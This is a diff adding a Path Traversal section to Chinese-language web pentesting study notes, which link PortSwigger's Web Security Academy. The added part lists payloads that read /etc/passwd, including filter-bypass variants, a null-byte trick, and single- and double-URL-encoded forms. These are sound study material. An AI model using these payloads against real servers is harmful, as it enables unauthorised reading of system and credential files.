@@ -310,12 +310,40 @@ PHP伪协议能否发挥功能，与PHP配置文件`php.ini`里的两个重要�
 
 - CORS（跨源资源共享）为远程文件包含提供了可能， 只要建立起源之间的信任关系，就可以触发远程文件包含。
 
+---
 
-### Path Traversal
+## Path Traversal
 
-路径遍历（[Path Traversal](../security/webpentesting.md#path-traversal)），也被称为目录遍历（Directory Traversal），这种漏洞允许攻击者在运行应用程序的的服务器上，读取或写入未授权的**任意文件**。这通常可能包括敏感的系统文件、应用程序代码、配置文件或用户数据。
+**路径遍历**（[Path Traversal](../security/webpentesting.md#path-traversal)），也被称为**目录遍历（Directory Traversal）**，这种漏洞允许攻击者在运行应用程序的的服务器上，读取或写入未授权的**任意文件**。这通常可能包括敏感的系统文件、应用程序代码、配置文件或用户数据。
 
 [portswigger Path traversal](https://portswigger.net/web-security/file-path-traversal)
+
+<span style="font-size: 19px;">**PoC**</span>
+
+```bash
+image?filename=../../../etc/passwd
+image?filename=....//....//....//etc/passwd
+image?filename=..././..././..././etc/passwd
+image?filename=....\/....\/....\/etc/passwd
+
+image?filename=/var/www/images/../../../etc/passwd
+
+image?filename=../../../etc/passwd%00.jpg
+```
+**url encoding**
+
+- `../` -> `%2e%2e%2f`
+- `%2e%2e%2f` -> `%252e%252e%252f`
+
+```bash
+# 原始
+image?filename=../../../etc/passwd
+# 一层
+image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+# 两层
+image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
+```
+
 
 ---
 
